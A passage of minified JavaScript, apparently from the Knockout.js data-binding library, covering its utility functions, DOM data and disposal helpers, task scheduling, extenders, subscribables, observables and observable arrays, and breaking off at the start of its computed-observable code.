          if (b.length) for (var c = 0, d = b.length; c < d; c++) k[b[c]] = a;
        });
        var l = {
            propertychange: !0
          },
          p = w && function () {
            for (var a = 3, b = w.createElement("div"), c = b.getElementsByTagName("i"); b.innerHTML = "\x3c!--[if gt IE " + ++a + "]><i></i><![endif]--\x3e", c[0];);
            return 4 < a ? a : n;
          }(),
          q = /\S+/g,
          t;
        return {
          Jc: ["authenticity_token", /^__RequestVerificationToken(_.*)?$/],
          D: function (a, b, c) {
            for (var d = 0, e = a.length; d < e; d++) b.call(c, a[d], d, a);
          },
          A: "function" == typeof Array.prototype.indexOf ? function (a, b) {
            return Array.prototype.indexOf.call(a, b);
          } : function (a, b) {
            for (var c = 0, d = a.length; c < d; c++) if (a[c] === b) return c;
            return -1;
          },
          Lb: function (a, b, c) {
            for (var d = 0, e = a.length; d < e; d++) if (b.call(c, a[d], d, a)) return a[d];
            return n;
          },
          Pa: function (b, c) {
            var d = a.a.A(b, c);
            0 < d ? b.splice(d, 1) : 0 === d && b.shift();
          },
          wc: function (b) {
            var c = [];
            b && a.a.D(b, function (b) {
              0 > a.a.A(c, b) && c.push(b);
            });
            return c;
          },
          Mb: function (a, b, c) {
            var d = [];
            if (a) for (var e = 0, l = a.length; e < l; e++) d.push(b.call(c, a[e], e));
            return d;
          },
          jb: function (a, b, c) {
            var d = [];
            if (a) for (var e = 0, l = a.length; e < l; e++) b.call(c, a[e], e) && d.push(a[e]);
            return d;
          },
          Nb: function (a, b) {
            if (b instanceof Array) a.push.apply(a, b);else for (var c = 0, d = b.length; c < d; c++) a.push(b[c]);
            return a;
          },
          Na: function (b, c, d) {
            var e = a.a.A(a.a.bc(b), c);
            0 > e ? d && b.push(c) : d || b.splice(e, 1);
          },
          Ba: g,
          extend: c,
          setPrototypeOf: d,
          Ab: g ? d : c,
          P: b,
          Ga: function (a, b, c) {
            if (!a) return a;
            var d = {},
              e;
            for (e in a) f.call(a, e) && (d[e] = b.call(c, a[e], e, a));
            return d;
          },
          Tb: function (b) {
            for (; b.firstChild;) a.removeNode(b.firstChild);
          },
          Yb: function (b) {
            b = a.a.la(b);
            for (var c = (b[0] && b[0].ownerDocument || w).createElement("div"), d = 0, e = b.length; d < e; d++) c.appendChild(a.oa(b[d]));
            return c;
          },
          Ca: function (b, c) {
            for (var d = 0, e = b.length, l = []; d < e; d++) {
              var k = b[d].cloneNode(!0);
              l.push(c ? a.oa(k) : k);
            }
            return l;
          },
          va: function (b, c) {
            a.a.Tb(b);
            if (c) for (var d = 0, e = c.length; d < e; d++) b.appendChild(c[d]);
          },
          Xc: function (b, c) {
            var d = b.nodeType ? [b] : b;
            if (0 < d.length) {
              for (var e = d[0], l = e.parentNode, k = 0, f = c.length; k < f; k++) l.insertBefore(c[k], e);
              k = 0;
              for (f = d.length; k < f; k++) a.removeNode(d[k]);
            }
          },
          Ua: function (a, b) {
            if (a.length) {
              for (b = 8 === b.nodeType && b.parentNode || b; a.length && a[0].parentNode !== b;) a.splice(0, 1);
              for (; 1 < a.length && a[a.length - 1].parentNode !== b;) a.length--;
              if (1 < a.length) {
                var c = a[0],
                  d = a[a.length - 1];
                for (a.length = 0; c !== d;) a.push(c), c = c.nextSibling;
                a.push(d);
              }
            }
            return a;
          },
          Zc: function (a, b) {
            7 > p ? a.setAttribute("selected", b) : a.selected = b;
          },
          Db: function (a) {
            return null === a || a === n ? "" : a.trim ? a.trim() : a.toString().replace(/^[\s\xa0]+|[\s\xa0]+$/g, "");
          },
          Ud: function (a, b) {
            a = a || "";
            return b.length > a.length ? !1 : a.substring(0, b.length) === b;
          },
          vd: function (a, b) {
            if (a === b) return !0;
            if (11 === a.nodeType) return !1;
            if (b.contains) return b.contains(1 !== a.nodeType ? a.parentNode : a);
            if (b.compareDocumentPosition) return 16 == (b.compareDocumentPosition(a) & 16);
            for (; a && a != b;) a = a.parentNode;
            return !!a;
          },
          Sb: function (b) {
            return a.a.vd(b, b.ownerDocument.documentElement);
          },
          kd: function (b) {
            return !!a.a.Lb(b, a.a.Sb);
          },
          R: function (a) {
            return a && a.tagName && a.tagName.toLowerCase();
          },
          Ac: function (b) {
            return a.onError ? function () {
              try {
                return b.apply(this, arguments);
              } catch (c) {
                throw a.onError && a.onError(c), c;
              }
            } : b;
          },
          setTimeout: function (b, c) {
            return setTimeout(a.a.Ac(b), c);
          },
          Gc: function (b) {
            setTimeout(function () {
              a.onError && a.onError(b);
              throw b;
            }, 0);
          },
          B: function (b, c, d) {
            var e = a.a.Ac(d);
            d = l[c];
            if (a.options.useOnlyNativeEvents || d || !v) {
              if (d || "function" != typeof b.addEventListener) {
                if ("undefined" != typeof b.attachEvent) {
                  var k = function (a) {
                      e.call(b, a);
                    },
                    f = "on" + c;
                  b.attachEvent(f, k);
                  a.a.K.za(b, function () {
                    b.detachEvent(f, k);
                  });
                } else throw Error("Browser doesn't support addEventListener or attachEvent");
              } else b.addEventListener(c, e, !1);
            } else t || (t = "function" == typeof v(b).on ? "on" : "bind"), v(b)[t](c, e);
          },
          Fb: function (b, c) {
            if (!b || !b.nodeType) throw Error("element must be a DOM node when calling triggerEvent");
            var d;
            "input" === a.a.R(b) && b.type && "click" == c.toLowerCase() ? (d = b.type, d = "checkbox" == d || "radio" == d) : d = !1;
            if (a.options.useOnlyNativeEvents || !v || d) {
              if ("function" == typeof w.createEvent) {
                if ("function" == typeof b.dispatchEvent) d = w.createEvent(k[c] || "HTMLEvents"), d.initEvent(c, !0, !0, A, 0, 0, 0, 0, 0, !1, !1, !1, !1, 0, b), b.dispatchEvent(d);else throw Error("The supplied element doesn't support dispatchEvent");
              } else if (d && b.click) b.click();else if ("undefined" != typeof b.fireEvent) b.fireEvent("on" + c);else throw Error("Browser doesn't support triggering events");
            } else v(b).trigger(c);
          },
          f: function (b) {
            return a.O(b) ? b() : b;
          },
          bc: function (b) {
            return a.O(b) ? b.v() : b;
          },
          Eb: function (b, c, d) {
            var l;
            c && ("object" === typeof b.classList ? (l = b.classList[d ? "add" : "remove"], a.a.D(c.match(q), function (a) {
              l.call(b.classList, a);
            })) : "string" === typeof b.className.baseVal ? e(b.className, "baseVal", c, d) : e(b, "className", c, d));
          },
          Bb: function (b, c) {
            var d = a.a.f(c);
            if (null === d || d === n) d = "";
            var e = a.h.firstChild(b);
            !e || 3 != e.nodeType || a.h.nextSibling(e) ? a.h.va(b, [b.ownerDocument.createTextNode(d)]) : e.data = d;
            a.a.Ad(b);
          },
          Yc: function (a, b) {
            a.name = b;
            if (7 >= p) try {
              var c = a.name.replace(/[&<>'"]/g, function (a) {
                return "&#" + a.charCodeAt(0) + ";";
              });
              a.mergeAttributes(w.createElement("<input name='" + c + "'/>"), !1);
            } catch (d) {}
          },
          Ad: function (a) {
            9 <= p && (a = 1 == a.nodeType ? a : a.parentNode, a.style && (a.style.zoom = a.style.zoom));
          },
          wd: function (a) {
            if (p) {
              var b = a.style.width;
              a.style.width = 0;
              a.style.width = b;
            }
          },
          Pd: function (b, c) {
            b = a.a.f(b);
            c = a.a.f(c);
            for (var d = [], e = b; e <= c; e++) d.push(e);
            return d;
          },
          la: function (a) {
            for (var b = [], c = 0, d = a.length; c < d; c++) b.push(a[c]);
            return b;
          },
          Da: function (a) {
            return h ? Symbol(a) : a;
          },
          Zd: 6 === p,
          $d: 7 === p,
          W: p,
          Lc: function (b, c) {
            for (var d = a.a.la(b.getElementsByTagName("input")).concat(a.a.la(b.getElementsByTagName("textarea"))), e = "string" == typeof c ? function (a) {
                return a.name === c;
              } : function (a) {
                return c.test(a.name);
              }, l = [], k = d.length - 1; 0 <= k; k--) e(d[k]) && l.push(d[k]);
            return l;
          },
          Nd: function (b) {
            return "string" == typeof b && (b = a.a.Db(b)) ? H && H.parse ? H.parse(b) : new Function("return " + b)() : null;
          },
          hc: function (b, c, d) {
            if (!H || !H.stringify) throw Error("Cannot find JSON.stringify(). Some browsers (e.g., IE < 8) don't support it natively, but you can overcome this by adding a script reference to json2.js, downloadable from http://www.json.org/json2.js");
            return H.stringify(a.a.f(b), c, d);
          },
          Od: function (c, d, e) {
            e = e || {};
            var l = e.params || {},
              k = e.includeFields || this.Jc,
              f = c;
            if ("object" == typeof c && "form" === a.a.R(c)) for (var f = c.action, h = k.length - 1; 0 <= h; h--) for (var g = a.a.Lc(c, k[h]), m = g.length - 1; 0 <= m; m--) l[g[m].name] = g[m].value;
            d = a.a.f(d);
            var p = w.createElement("form");
            p.style.display = "none";
            p.action = f;
            p.method = "post";
            for (var q in d) c = w.createElement("input"), c.type = "hidden", c.name = q, c.value = a.a.hc(a.a.f(d[q])), p.appendChild(c);
            b(l, function (a, b) {
              var c = w.createElement("input");
              c.type = "hidden";
              c.name = a;
              c.value = b;
              p.appendChild(c);
            });
            w.body.appendChild(p);
            e.submitter ? e.submitter(p) : p.submit();
            setTimeout(function () {
              p.parentNode.removeChild(p);
            }, 0);
          }
        };
      }();
      a.b("utils", a.a);
      a.b("utils.arrayForEach", a.a.D);
      a.b("utils.arrayFirst", a.a.Lb);
      a.b("utils.arrayFilter", a.a.jb);
      a.b("utils.arrayGetDistinctValues", a.a.wc);
      a.b("utils.arrayIndexOf", a.a.A);
      a.b("utils.arrayMap", a.a.Mb);
      a.b("utils.arrayPushAll", a.a.Nb);
      a.b("utils.arrayRemoveItem", a.a.Pa);
      a.b("utils.cloneNodes", a.a.Ca);
      a.b("utils.createSymbolOrString", a.a.Da);
      a.b("utils.extend", a.a.extend);
      a.b("utils.fieldsIncludedWithJsonPost", a.a.Jc);
      a.b("utils.getFormFields", a.a.Lc);
      a.b("utils.objectMap", a.a.Ga);
      a.b("utils.peekObservable", a.a.bc);
      a.b("utils.postJson", a.a.Od);
      a.b("utils.parseJson", a.a.Nd);
      a.b("utils.registerEventHandler", a.a.B);
      a.b("utils.stringifyJson", a.a.hc);
      a.b("utils.range", a.a.Pd);
      a.b("utils.toggleDomNodeCssClass", a.a.Eb);
      a.b("utils.triggerEvent", a.a.Fb);
      a.b("utils.unwrapObservable", a.a.f);
      a.b("utils.objectForEach", a.a.P);
      a.b("utils.addOrRemoveItem", a.a.Na);
      a.b("utils.setTextContent", a.a.Bb);
      a.b("unwrap", a.a.f);
      Function.prototype.bind || (Function.prototype.bind = function (a) {
        var c = this;
        if (1 === arguments.length) return function () {
          return c.apply(a, arguments);
        };
        var d = Array.prototype.slice.call(arguments, 1);
        return function () {
          var e = d.slice(0);
          e.push.apply(e, arguments);
          return c.apply(a, e);
        };
      });
      a.a.g = new function () {
        var b = 0,
          c = "__ko__" + new Date().getTime(),
          d = {},
          e,
          f;
        a.a.W ? (e = function (a, e) {
          var f = a[c];
          if (!f || "null" === f || !d[f]) {
            if (!e) return n;
            f = a[c] = "ko" + b++;
            d[f] = {};
          }
          return d[f];
        }, f = function (a) {
          var b = a[c];
          return b ? (delete d[b], a[c] = null, !0) : !1;
        }) : (e = function (a, b) {
          var d = a[c];
          !d && b && (d = a[c] = {});
          return d;
        }, f = function (a) {
          return a[c] ? (delete a[c], !0) : !1;
        });
        return {
          get: function (a, b) {
            var c = e(a, !1);
            return c && c[b];
          },
          set: function (a, b, c) {
            (a = e(a, c !== n)) && (a[b] = c);
          },
          Ub: function (a, b, c) {
            a = e(a, !0);
            return a[b] || (a[b] = c);
          },
          clear: f,
          Z: function () {
            return b++ + c;
          }
        };
      }();
      a.b("utils.domData", a.a.g);
      a.b("utils.domData.clear", a.a.g.clear);
      a.a.K = new function () {
        function b(b, c) {
          var d = a.a.g.get(b, e);
          d === n && c && (d = [], a.a.g.set(b, e, d));
          return d;
        }
        function c(c) {
          var e = b(c, !1);
          if (e) for (var e = e.slice(0), k = 0; k < e.length; k++) e[k](c);
          a.a.g.clear(c);
          a.a.K.cleanExternalData(c);
          g[c.nodeType] && d(c.childNodes, !0);
        }
        function d(b, d) {
          for (var e = [], l, f = 0; f < b.length; f++) if (!d || 8 === b[f].nodeType) if (c(e[e.length] = l = b[f]), b[f] !== l) for (; f-- && -1 == a.a.A(e, b[f]););
        }
        var e = a.a.g.Z(),
          f = {
            1: !0,
            8: !0,
            9: !0
          },
          g = {
            1: !0,
            9: !0
          };
        return {
          za: function (a, c) {
            if ("function" != typeof c) throw Error("Callback must be a function");
            b(a, !0).push(c);
          },
          yb: function (c, d) {
            var f = b(c, !1);
            f && (a.a.Pa(f, d), 0 == f.length && a.a.g.set(c, e, n));
          },
          oa: function (b) {
            a.u.G(function () {
              f[b.nodeType] && (c(b), g[b.nodeType] && d(b.getElementsByTagName("*")));
            });
            return b;
          },
          removeNode: function (b) {
            a.oa(b);
            b.parentNode && b.parentNode.removeChild(b);
          },
          cleanExternalData: function (a) {
            v && "function" == typeof v.cleanData && v.cleanData([a]);
          }
        };
      }();
      a.oa = a.a.K.oa;
      a.removeNode = a.a.K.removeNode;
      a.b("cleanNode", a.oa);
      a.b("removeNode", a.removeNode);
      a.b("utils.domNodeDisposal", a.a.K);
      a.b("utils.domNodeDisposal.addDisposeCallback", a.a.K.za);
      a.b("utils.domNodeDisposal.removeDisposeCallback", a.a.K.yb);
      (function () {
        var b = [0, "", ""],
          c = [1, "<table>", "</table>"],
          d = [3, "<table><tbody><tr>", "</tr></tbody></table>"],
          e = [1, "<select multiple='multiple'>", "</select>"],
          f = {
            thead: c,
            tbody: c,
            tfoot: c,
            tr: [2, "<table><tbody>", "</tbody></table>"],
            td: d,
            th: d,
            option: e,
            optgroup: e
          },
          g = 8 >= a.a.W;
        a.a.ua = function (c, d) {
          var e;
          if (v) {
            if (v.parseHTML) e = v.parseHTML(c, d) || [];else {
              if ((e = v.clean([c], d)) && e[0]) {
                for (var l = e[0]; l.parentNode && 11 !== l.parentNode.nodeType;) l = l.parentNode;
                l.parentNode && l.parentNode.removeChild(l);
              }
            }
          } else {
            (e = d) || (e = w);
            var l = e.parentWindow || e.defaultView || A,
              p = a.a.Db(c).toLowerCase(),
              q = e.createElement("div"),
              t;
            t = (p = p.match(/^(?:\x3c!--.*?--\x3e\s*?)*?<([a-z]+)[\s>]/)) && f[p[1]] || b;
            p = t[0];
            t = "ignored<div>" + t[1] + c + t[2] + "</div>";
            "function" == typeof l.innerShiv ? q.appendChild(l.innerShiv(t)) : (g && e.body.appendChild(q), q.innerHTML = t, g && q.parentNode.removeChild(q));
            for (; p--;) q = q.lastChild;
            e = a.a.la(q.lastChild.childNodes);
          }
          return e;
        };
        a.a.Md = function (b, c) {
          var d = a.a.ua(b, c);
          return d.length && d[0].parentElement || a.a.Yb(d);
        };
        a.a.fc = function (b, c) {
          a.a.Tb(b);
          c = a.a.f(c);
          if (null !== c && c !== n) if ("string" != typeof c && (c = c.toString()), v) v(b).html(c);else for (var d = a.a.ua(c, b.ownerDocument), e = 0; e < d.length; e++) b.appendChild(d[e]);
        };
      })();
      a.b("utils.parseHtmlFragment", a.a.ua);
      a.b("utils.setHtml", a.a.fc);
      a.aa = function () {
        function b(c, e) {
          if (c) if (8 == c.nodeType) {
            var f = a.aa.Uc(c.nodeValue);
            null != f && e.push({
              ud: c,
              Kd: f
            });
          } else if (1 == c.nodeType) for (var f = 0, g = c.childNodes, h = g.length; f < h; f++) b(g[f], e);
        }
        var c = {};
        return {
          Xb: function (a) {
            if ("function" != typeof a) throw Error("You can only pass a function to ko.memoization.memoize()");
            var b = (4294967296 * (1 + Math.random()) | 0).toString(16).substring(1) + (4294967296 * (1 + Math.random()) | 0).toString(16).substring(1);
            c[b] = a;
            return "\x3c!--[ko_memo:" + b + "]--\x3e";
          },
          bd: function (a, b) {
            var f = c[a];
            if (f === n) throw Error("Couldn't find any memo with ID " + a + ". Perhaps it's already been unmemoized.");
            try {
              return f.apply(null, b || []), !0;
            } finally {
              delete c[a];
            }
          },
          cd: function (c, e) {
            var f = [];
            b(c, f);
            for (var g = 0, h = f.length; g < h; g++) {
              var m = f[g].ud,
                k = [m];
              e && a.a.Nb(k, e);
              a.aa.bd(f[g].Kd, k);
              m.nodeValue = "";
              m.parentNode && m.parentNode.removeChild(m);
            }
          },
          Uc: function (a) {
            return (a = a.match(/^\[ko_memo\:(.*?)\]$/)) ? a[1] : null;
          }
        };
      }();
      a.b("memoization", a.aa);
      a.b("memoization.memoize", a.aa.Xb);
      a.b("memoization.unmemoize", a.aa.bd);
      a.b("memoization.parseMemoText", a.aa.Uc);
      a.b("memoization.unmemoizeDomNodeAndDescendants", a.aa.cd);
      a.na = function () {
        function b() {
          if (f) for (var b = f, c = 0, d; h < f;) if (d = e[h++]) {
            if (h > b) {
              if (5E3 <= ++c) {
                h = f;
                a.a.Gc(Error("'Too much recursion' after processing " + c + " task groups."));
                break;
              }
              b = f;
            }
            try {
              d();
            } catch (p) {
              a.a.Gc(p);
            }
          }
        }
        function c() {
          b();
          h = f = e.length = 0;
        }
        var d,
          e = [],
          f = 0,
          g = 1,
          h = 0;
        A.MutationObserver ? d = function (a) {
          var b = w.createElement("div");
          new MutationObserver(a).observe(b, {
            attributes: !0
          });
          return function () {
            b.classList.toggle("foo");
          };
        }(c) : d = w && "onreadystatechange" in w.createElement("script") ? function (a) {
          var b = w.createElement("script");
          b.onreadystatechange = function () {
            b.onreadystatechange = null;
            w.documentElement.removeChild(b);
            b = null;
            a();
          };
          w.documentElement.appendChild(b);
        } : function (a) {
          setTimeout(a, 0);
        };
        return {
          scheduler: d,
          zb: function (b) {
            f || a.na.scheduler(c);
            e[f++] = b;
            return g++;
          },
          cancel: function (a) {
            a = a - (g - f);
            a >= h && a < f && (e[a] = null);
          },
          resetForTesting: function () {
            var a = f - h;
            h = f = e.length = 0;
            return a;
          },
          Sd: b
        };
      }();
      a.b("tasks", a.na);
      a.b("tasks.schedule", a.na.zb);
      a.b("tasks.runEarly", a.na.Sd);
      a.Ta = {
        throttle: function (b, c) {
          b.throttleEvaluation = c;
          var d = null;
          return a.$({
            read: b,
            write: function (e) {
              clearTimeout(d);
              d = a.a.setTimeout(function () {
                b(e);
              }, c);
            }
          });
        },
        rateLimit: function (a, c) {
          var d, e, f;
          "number" == typeof c ? d = c : (d = c.timeout, e = c.method);
          a.Hb = !1;
          f = "function" == typeof e ? e : "notifyWhenChangesStop" == e ? Y : X;
          a.ub(function (a) {
            return f(a, d, c);
          });
        },
        deferred: function (b, c) {
          if (!0 !== c) throw Error("The 'deferred' extender only accepts the value 'true', because it is not supported to turn deferral off once enabled.");
          b.Hb || (b.Hb = !0, b.ub(function (c) {
            var e,
              f = !1;
            return function () {
              if (!f) {
                a.na.cancel(e);
                e = a.na.zb(c);
                try {
                  f = !0, b.notifySubscribers(n, "dirty");
                } finally {
                  f = !1;
                }
              }
            };
          }));
        },
        notify: function (a, c) {
          a.equalityComparer = "always" == c ? null : K;
        }
      };
      var W = {
        undefined: 1,
        "boolean": 1,
        number: 1,
        string: 1
      };
      a.b("extenders", a.Ta);
      a.ic = function (b, c, d) {
        this.da = b;
        this.lc = c;
        this.mc = d;
        this.Ib = !1;
        this.fb = this.Jb = null;
        a.L(this, "dispose", this.s);
        a.L(this, "disposeWhenNodeIsRemoved", this.l);
      };
      a.ic.prototype.s = function () {
        this.Ib || (this.fb && a.a.K.yb(this.Jb, this.fb), this.Ib = !0, this.mc(), this.da = this.lc = this.mc = this.Jb = this.fb = null);
      };
      a.ic.prototype.l = function (b) {
        this.Jb = b;
        a.a.K.za(b, this.fb = this.s.bind(this));
      };
      a.T = function () {
        a.a.Ab(this, D);
        D.qb(this);
      };
      var D = {
        qb: function (a) {
          a.U = {
            change: []
          };
          a.sc = 1;
        },
        subscribe: function (b, c, d) {
          var e = this;
          d = d || "change";
          var f = new a.ic(e, c ? b.bind(c) : b, function () {
            a.a.Pa(e.U[d], f);
            e.hb && e.hb(d);
          });
          e.Qa && e.Qa(d);
          e.U[d] || (e.U[d] = []);
          e.U[d].push(f);
          return f;
        },
        notifySubscribers: function (b, c) {
          c = c || "change";
          "change" === c && this.Gb();
          if (this.Wa(c)) {
            var d = "change" === c && this.ed || this.U[c].slice(0);
            try {
              a.u.xc();
              for (var e = 0, f; f = d[e]; ++e) f.Ib || f.lc(b);
            } finally {
              a.u.end();
            }
          }
        },
        ob: function () {
          return this.sc;
        },
        Dd: function (a) {
          return this.ob() !== a;
        },
        Gb: function () {
          ++this.sc;
        },
        ub: function (b) {
          var c = this,
            d = a.O(c),
            e,
            f,
            g,
            h,
            m;
          c.gb || (c.gb = c.notifySubscribers, c.notifySubscribers = Z);
          var k = b(function () {
            c.Ja = !1;
            d && h === c && (h = c.nc ? c.nc() : c());
            var a = f || m && c.sb(g, h);
            m = f = e = !1;
            a && c.gb(g = h);
          });
          c.qc = function (a, b) {
            b && c.Ja || (m = !b);
            c.ed = c.U.change.slice(0);
            c.Ja = e = !0;
            h = a;
            k();
          };
          c.pc = function (a) {
            e || (g = a, c.gb(a, "beforeChange"));
          };
          c.rc = function () {
            m = !0;
          };
          c.gd = function () {
            c.sb(g, c.v(!0)) && (f = !0);
          };
        },
        Wa: function (a) {
          return this.U[a] && this.U[a].length;
        },
        Bd: function (b) {
          if (b) return this.U[b] && this.U[b].length || 0;
          var c = 0;
          a.a.P(this.U, function (a, b) {
            "dirty" !== a && (c += b.length);
          });
          return c;
        },
        sb: function (a, c) {
          return !this.equalityComparer || !this.equalityComparer(a, c);
        },
        toString: function () {
          return "[object Object]";
        },
        extend: function (b) {
          var c = this;
          b && a.a.P(b, function (b, e) {
            var f = a.Ta[b];
            "function" == typeof f && (c = f(c, e) || c);
          });
          return c;
        }
      };
      a.L(D, "init", D.qb);
      a.L(D, "subscribe", D.subscribe);
      a.L(D, "extend", D.extend);
      a.L(D, "getSubscriptionsCount", D.Bd);
      a.a.Ba && a.a.setPrototypeOf(D, Function.prototype);
      a.T.fn = D;
      a.Qc = function (a) {
        return null != a && "function" == typeof a.subscribe && "function" == typeof a.notifySubscribers;
      };
      a.b("subscribable", a.T);
      a.b("isSubscribable", a.Qc);
      a.S = a.u = function () {
        function b(a) {
          d.push(e);
          e = a;
        }
        function c() {
          e = d.pop();
        }
        var d = [],
          e,
          f = 0;
        return {
          xc: b,
          end: c,
          cc: function (b) {
            if (e) {
              if (!a.Qc(b)) throw Error("Only subscribable things can act as dependencies");
              e.od.call(e.pd, b, b.fd || (b.fd = ++f));
            }
          },
          G: function (a, d, e) {
            try {
              return b(), a.apply(d, e || []);
            } finally {
              c();
            }
          },
          qa: function () {
            if (e) return e.o.qa();
          },
          Va: function () {
            if (e) return e.o.Va();
          },
          Ya: function () {
            if (e) return e.Ya;
          },
          o: function () {
            if (e) return e.o;
          }
        };
      }();
      a.b("computedContext", a.S);
      a.b("computedContext.getDependenciesCount", a.S.qa);
      a.b("computedContext.getDependencies", a.S.Va);
      a.b("computedContext.isInitial", a.S.Ya);
      a.b("computedContext.registerDependency", a.S.cc);
      a.b("ignoreDependencies", a.Yd = a.u.G);
      var I = a.a.Da("_latestValue");
      a.ta = function (b) {
        function c() {
          if (0 < arguments.length) return c.sb(c[I], arguments[0]) && (c.ya(), c[I] = arguments[0], c.xa()), this;
          a.u.cc(c);
          return c[I];
        }
        c[I] = b;
        a.a.Ba || a.a.extend(c, a.T.fn);
        a.T.fn.qb(c);
        a.a.Ab(c, F);
        a.options.deferUpdates && a.Ta.deferred(c, !0);
        return c;
      };
      var F = {
        equalityComparer: K,
        v: function () {
          return this[I];
        },
        xa: function () {
          this.notifySubscribers(this[I], "spectate");
          this.notifySubscribers(this[I]);
        },
        ya: function () {
          this.notifySubscribers(this[I], "beforeChange");
        }
      };
      a.a.Ba && a.a.setPrototypeOf(F, a.T.fn);
      var G = a.ta.Ma = "__ko_proto__";
      F[G] = a.ta;
      a.O = function (b) {
        if ((b = "function" == typeof b && b[G]) && b !== F[G] && b !== a.o.fn[G]) throw Error("Invalid object that looks like an observable; possibly from another Knockout instance");
        return !!b;
      };
      a.Za = function (b) {
        return "function" == typeof b && (b[G] === F[G] || b[G] === a.o.fn[G] && b.Nc);
      };
      a.b("observable", a.ta);
      a.b("isObservable", a.O);
      a.b("isWriteableObservable", a.Za);
      a.b("isWritableObservable", a.Za);
      a.b("observable.fn", F);
      a.L(F, "peek", F.v);
      a.L(F, "valueHasMutated", F.xa);
      a.L(F, "valueWillMutate", F.ya);
      a.Ha = function (b) {
        b = b || [];
        if ("object" != typeof b || !("length" in b)) throw Error("The argument passed when initializing an observable array must be an array, or null, or undefined.");
        b = a.ta(b);
        a.a.Ab(b, a.Ha.fn);
        return b.extend({
          trackArrayChanges: !0
        });
      };
      a.Ha.fn = {
        remove: function (b) {
          for (var c = this.v(), d = [], e = "function" != typeof b || a.O(b) ? function (a) {
              return a === b;
            } : b, f = 0; f < c.length; f++) {
            var g = c[f];
            if (e(g)) {
              0 === d.length && this.ya();
              if (c[f] !== g) throw Error("Array modified during remove; cannot remove item");
              d.push(g);
              c.splice(f, 1);
              f--;
            }
          }
          d.length && this.xa();
          return d;
        },
        removeAll: function (b) {
          if (b === n) {
            var c = this.v(),
              d = c.slice(0);
            this.ya();
            c.splice(0, c.length);
            this.xa();
            return d;
          }
          return b ? this.remove(function (c) {
            return 0 <= a.a.A(b, c);
          }) : [];
        },
        destroy: function (b) {
          var c = this.v(),
            d = "function" != typeof b || a.O(b) ? function (a) {
              return a === b;
            } : b;
          this.ya();
          for (var e = c.length - 1; 0 <= e; e--) {
            var f = c[e];
            d(f) && (f._destroy = !0);
          }
          this.xa();
        },
        destroyAll: function (b) {
          return b === n ? this.destroy(function () {
            return !0;
          }) : b ? this.destroy(function (c) {
            return 0 <= a.a.A(b, c);
          }) : [];
        },
        indexOf: function (b) {
          var c = this();
          return a.a.A(c, b);
        },
        replace: function (a, c) {
          var d = this.indexOf(a);
          0 <= d && (this.ya(), this.v()[d] = c, this.xa());
        },
        sorted: function (a) {
          var c = this().slice(0);
          return a ? c.sort(a) : c.sort();
        },
        reversed: function () {
          return this().slice(0).reverse();
        }
      };
      a.a.Ba && a.a.setPrototypeOf(a.Ha.fn, a.ta.fn);
      a.a.D("pop push reverse shift sort splice unshift".split(" "), function (b) {
        a.Ha.fn[b] = function () {
          var a = this.v();
          this.ya();
          this.zc(a, b, arguments);
          var d = a[b].apply(a, arguments);
          this.xa();
          return d === a ? this : d;
        };
      });
      a.a.D(["slice"], function (b) {
        a.Ha.fn[b] = function () {
          var a = this();
          return a[b].apply(a, arguments);
        };
      });
      a.Pc = function (b) {
        return a.O(b) && "function" == typeof b.remove && "function" == typeof b.push;
      };
      a.b("observableArray", a.Ha);
      a.b("isObservableArray", a.Pc);
      a.Ta.trackArrayChanges = function (b, c) {
        function d() {
          function c() {
            if (m) {
              var d = [].concat(b.v() || []),
                e;
              if (b.Wa("arrayChange")) {
                if (!f || 1 < m) f = a.a.Pb(k, d, b.Ob);
                e = f;
              }
              k = d;
              f = null;
              m = 0;
              e && e.length && b.notifySubscribers(e, "arrayChange");
            }
          }
          e ? c() : (e = !0, h = b.subscribe(function () {
            ++m;
          }, null, "spectate"), k = [].concat(b.v() || []), f = null, g = b.subscribe(c));
        }
        b.Ob = {};
        c && "object" == typeof c && a.a.extend(b.Ob, c);
        b.Ob.sparse = !0;
        if (!b.zc) {
          var e = !1,
            f = null,
            g,
            h,
            m = 0,
            k,
            l = b.Qa,
            p = b.hb;
          b.Qa = function (a) {
            l && l.call(b, a);
            "arrayChange" === a && d();
          };
          b.hb = function (a) {
            p && p.call(b, a);
            "arrayChange" !== a || b.Wa("arrayChange") || (g && g.s(), h && h.s(), h = g = null, e = !1, k = n);
          };
          b.zc = function (b, c, d) {
            function l(a, b, c) {
              return k[k.length] = {
                status: a,
                value: b,
                index: c
              };
            }
            if (e && !m) {
              var k = [],
                p = b.length,
                g = d.length,
                h = 0;
              switch (c) {
                case "push":
                  h = p;
                case "unshift":
                  for (c = 0; c < g; c++) l("added", d[c], h + c);
                  break;
                case "pop":
                  h = p - 1;
                case "shift":
                  p && l("deleted", b[h], h);
                  break;
                case "splice":
                  c = Math.min(Math.max(0, 0 > d[0] ? p + d[0] : d[0]), p);
                  for (var p = 1 === g ? p : Math.min(c + (d[1] || 0), p), g = c + g - 2, h = Math.max(p, g), U = [], L = [], n = 2; c < h; ++c, ++n) c < p && L.push(l("deleted", b[c], c)), c < g && U.push(l("added", d[n], c));
                  a.a.Kc(L, U);
                  break;
                default:
                  return;
              }
              f = k;
            }
          };
        }
      };
      var r = a.a.Da("_state");
      a.o = a.$ = function (b, c, d) {
        function e() {
          if (0 < arguments.length) {
            if ("function" === typeof f) f.apply(g.nb, arguments);else throw Error("Cannot write a value to a ko.computed unless you specify a 'write' option. If you wish to read the current value, don't pass any parameters.");
            return this;
          }
          g.ra || a.u.cc(e);
          (g.ka || g.J && e.Xa()) && e.ha();
          return g.X;
        }
        "object" === typeof b ? d = b : (d = d || {}, b && (d.read = b));
        if ("function" != typeof d.read) throw Error("Pass a function that returns the value of the ko.computed");
        var f = d.write,
          g = {
            X: n,
            sa: !0,
            ka: !0,
            rb: !1,
            jc: !1,
            ra: !1,
            wb: !1,
            J: !1,
            Wc: d.read,
            nb: c || d.owner,
            l: d.disposeWhenNodeIsRemoved || d.l || null,
            Sa: d.disposeWhen || d.Sa,
            Rb: null,
            I: {},
            V: 0,
            Ic: null
          };
        e[r] = g;
        e.Nc = "function" === typeof f;
        a.a.Ba || a.a.extend(e, a.T.fn);
        a.T.fn.qb(e);
        a.a.Ab(e, C);
        d.pure ? (g.wb = !0, g.J = !0, a.a.extend(e, da)) : d.deferEvaluation && a.a.extend(e, ea);
        a.options.deferUpdates && a.Ta.deferred(e, !0);
        g.l && (g.jc = !0, g.l.nodeType || (g.l = null));
        g.J || d.deferEvaluation || e.ha();
        g.l && e.ja() && a.a.K.za(g.l, g.Rb = function () {
          e.s();
        });
        return e;
      };
      var C = {
          equalityComparer: K,
          qa: function () {
